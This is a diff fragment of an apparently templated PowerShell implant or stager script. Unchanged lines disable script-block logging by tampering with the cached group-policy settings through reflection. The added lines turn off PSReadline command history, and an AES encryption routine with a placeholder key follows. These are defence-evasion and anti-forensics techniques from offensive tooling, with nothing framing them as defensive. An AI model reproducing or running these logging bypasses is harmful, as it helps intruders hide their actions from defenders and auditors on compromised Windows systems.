@@ -5,6 +5,9 @@ $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetFiel
 $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
 $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
 
+{#- Disable Readline Histfile #-}
+try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
+
 $KEY = ${{symbol_name("KEY")}}
 
 function Encrypt-AES {
